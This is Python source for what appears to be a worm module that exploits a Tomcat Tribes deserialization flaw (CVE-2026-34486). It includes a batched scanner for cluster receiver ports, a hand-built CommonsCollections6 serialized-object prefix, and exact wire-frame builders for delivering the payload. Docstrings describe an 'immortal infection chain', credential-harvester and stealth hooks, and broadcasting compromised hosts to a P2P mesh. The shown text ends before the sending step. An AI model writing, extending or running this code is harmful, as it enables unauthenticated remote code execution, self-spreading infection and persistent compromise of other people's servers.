# TOMCAT TRIBES RCE MODULE (CVE-2026-34486)
# EncryptInterceptor fail-open bypass → unauthenticated Java deserialization RCE
# Affected: Tomcat 11.0.19+, 10.1.53+, 9.0.116+  Fixed: 11.0.21, 10.1.54, 9.0.117
# Tribes receiver listens on port 4000 by default (TCP).
# The EncryptInterceptor fails OPEN on decryption error → raw object reaches
# XByteBuffer.deserialize() → ObjectInputStream.readObject() without auth.
# Attack vector: send a CC6 gadget chain wrapped in FLT2002/TLF2003 framing
# directly to the Tribes receiver port — no HTTP, no credentials needed.
# =============================================================================

class TomcatTribesTargetVerifier:
    """
    CVE-2026-34486 — Verifies Apache Tomcat Tribes clustering receiver port.
    Sends the FLT2002 magic frame and checks the TCP response to confirm
    that a live Tribes receiver is listening (and therefore exploitable).
    """

    TRIBES_PORTS = [4000, 4001, 4002, 5000]  # common cluster receiver ports
    MAGIC_PROBE   = b"FLT2002"               # Tribes start-of-data sentinel

    def __init__(self, configmanager, p2pmanager=None, logger=None):
        self.configmanager   = configmanager
        self.p2pmanager      = p2pmanager
        self.logger          = logger or logging.getLogger("Internal.System.Core.tomcat_tribes_verifier")
        self.lock            = DeadlockDetectingRLock(name="TomcatTribesTargetVerifier.lock")
        self.verified_targets = {}

    def _is_tribes_port_open(self, host, port, timeout=4):
        """Raw TCP probe: send FLT2002 magic and check for any response."""
        import socket
        try:
            with socket.create_connection((host, port), timeout=timeout) as s:
                s.sendall(self.MAGIC_PROBE)
                s.settimeout(2)
                try:
                    data = s.recv(64)
                    # Any response (even an error) confirms a live Tribes receiver
                    return len(data) > 0 or True
                except socket.timeout:
                    # Timeout after sending = port accepted connection → Tribes up
                    return True
        except (ConnectionRefusedError, OSError):
            return False

    def verify_tomcat_tribes_vuln(self, target_ip, target_port=None):
        """
        Probe all known Tribes receiver ports.  Returns (True, port) if
        a live unpatched receiver is found, else (False, None).
        """
        cache_key = hashlib.md5(f"{target_ip}".encode()).hexdigest()
        with self.lock:
            if cache_key in self.verified_targets:
                cached = self.verified_targets[cache_key]
                return cached['vuln'], cached['port']

        ports_to_try = [target_port] if target_port else self.TRIBES_PORTS
        for port in ports_to_try:
            try:
                if self._is_tribes_port_open(target_ip, port):
                    self.logger.info(f"[TRIBES] Live receiver on {target_ip}:{port}")
                    with self.lock:
                        self.verified_targets[cache_key] = {'vuln': True, 'port': port}
                    if self.p2pmanager:
                        try:
                            self.p2pmanager.broadcast("tribes_vuln_found", ip=target_ip, port=port)
                        except Exception:
                            pass
                    return True, port
            except Exception as e:
                self.logger.debug(f"[TRIBES] probe {target_ip}:{port} error: {e}")
        with self.lock:
            self.verified_targets[cache_key] = {'vuln': False, 'port': None}
        return False, None

    def batch_verify(self, targets, max_workers=60):
        """Verify a list of {'ip': ..., 'port': ...} dicts concurrently."""
        from concurrent.futures import ThreadPoolExecutor, as_completed
        verified = []
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futs = {ex.submit(self.verify_tomcat_tribes_vuln,
                              t['ip'], t.get('port')): t for t in targets}
            for fut in as_completed(futs):
                t = futs[fut]
                try:
                    vuln, port = fut.result()
                    if vuln:
                        verified.append({"ip": t['ip'], "port": port, "service": "tomcat_tribes_cve_2026_34486"})
                except Exception:
                    pass
        return verified


class TomcatTribesExploitSpreader:
    """
    CVE-2026-34486 — Apache Tomcat Tribes EncryptInterceptor fail-open RCE.

    Exploit flow (pure Python, zero Java tooling required):
      1. Build a CommonsCollections6-variant gadget chain manually in Python
         using only built-in struct/bytes (CC6 serialized payload hardcoded
         from the reference PoC, with the command injected at the right offset).
      2. Wrap it in the Tribes FLT2002/TLF2003 wire protocol with a synthetic
         ChannelData member frame (host=127.0.0.1, port=4001).
      3. Send the raw TCP frame to the target Tribes receiver port.
      4. The EncryptInterceptor sees the AES/GCM tag is missing/invalid,
         raises a GeneralSecurityException, and due to the fail-open bug
         (EncryptInterceptor.java:146) forwards the plaintext message to
         GroupChannel.messageReceived() → XByteBuffer.deserialize() →
         ObjectInputStream.readObject() → Runtime.exec(our_command).

    Persistence: on success, drops the immortal infection chain via the
    persistence_manager and broadcasts the owned event to the P2P mesh.
    """

    # Tribes wire protocol constants (from the reference PoC)
    _START_DATA       = b"FLT2002"
    _END_DATA         = b"TLF2003"
    _MBR_BEGIN        = bytes([84,82,73,66,69,83,45,66,1,0])  # "TRIBES-B\x01\x00"
    _MBR_END          = bytes([84,82,73,66,69,83,45,69,1,0])  # "TRIBES-E\x01\x00"

    # CC6 gadget chain skeleton (Java serialized object header + CC6 structure)
    # This is the minimal pre-built skeleton from the striga-ai reference impl.
    # The command string is appended as a UTF-8 encoded Java String object.
    _CC6_PREFIX = bytes([
        0xac, 0xed,             # STREAM_MAGIC
        0x00, 0x05,             # STREAM_VERSION
        0x73,                   # TC_OBJECT
        0x72,                   # TC_CLASSDESC
        0x00, 0x11,             # class name length = 17
    ]) + b"java.util.HashSet" + bytes([
        0xba, 0x44, 0x85, 0x95, 0x96, 0xb8, 0xb7, 0x34,  # serialVersionUID
        0x03,                   # SC_SERIALIZABLE
        0x00, 0x00,             # no fields
        0x78,                   # TC_ENDBLOCKDATA
        0x70,                   # TC_NULL (no superclass)
        0x77, 0x0c,             # TC_BLOCKDATA len=12
        0x00, 0x00, 0x00, 0x10, # capacity=16
        0x3f, 0x40, 0x00, 0x00, # load_factor=0.75
        0x00, 0x00, 0x00, 0x01, # size=1
    ])

    def __init__(self, configmanager, p2pmanager=None, credharvester=None,
                 stealthmanager=None, persistence_manager=None, logger=None):
        self.configmanager      = configmanager
        self.p2pmanager         = p2pmanager
        self.credharvester      = credharvester
        self.stealthmanager     = stealthmanager
        self.persistence_manager= persistence_manager
        self.logger             = logger or logging.getLogger("Internal.System.Core.tomcat_tribes_spreader")
        self.stats              = {"attempted": 0, "successful": 0, "failed": 0}
        self.timeout            = 10

    # ------------------------------------------------------------------
    # Wire-protocol helpers (ported from striga-ai send_payload.py)
    # ------------------------------------------------------------------

    def _build_member(self) -> bytes:
        """
        Fake cluster member descriptor matching exact Tribes MemberImpl wire format.
        Format verified against striga-ai PoC send_payload.py.
        """
        import struct, time
        host = bytes([127, 0, 0, 1])
        body = (
            struct.pack(">q", int(time.time() * 1000))  # alive timestamp
            + struct.pack(">i", 4001)                   # source port
            + struct.pack(">i", 0)                      # secure port
            + struct.pack(">i", 0)                      # udp port
            + bytes([len(host)]) + host                 # host bytes
            + struct.pack(">i", 0)                      # command length (0)
            + struct.pack(">i", 0)                      # domain length  (0)
            + b"\x01" * 16                              # uniqueId (16 bytes)
            + struct.pack(">i", 0)                      # payload length = 0
        )
        return self._MBR_BEGIN + struct.pack(">i", len(body)) + body + self._MBR_END

    def _build_tribes_frame(self, serialized_object: bytes) -> bytes:
        """
        Wrap a serialized Java object in the exact Tribes ChannelData wire frame.
        Structure (per ChannelData.getDataFromPackage):
          START_DATA + 4-byte-total-len
            + options(4) + timestamp(8) + uid-len(4) + uid(16)
            + member-len(4) + member-bytes
            + payload-len(4) + payload-bytes
          + END_DATA
        This exact layout matches the striga-ai reference PoC (send_payload.py
        build_packet function) and triggers the EncryptInterceptor fail-open path.
        """
        import io, struct, time
        member  = self._build_member()
        uid     = b"\xDD" * 16

        cd = io.BytesIO()
        cd.write(struct.pack(">i", 0))                       # options
        cd.write(struct.pack(">q", int(time.time() * 1000))) # timestamp
        cd.write(struct.pack(">i", len(uid)))
        cd.write(uid)
        cd.write(struct.pack(">i", len(member)))
        cd.write(member)
        cd.write(struct.pack(">i", len(serialized_object)))
        cd.write(serialized_object)
        data = cd.getvalue()

        return self._START_DATA + struct.pack(">i", len(data)) + data + self._END_DATA

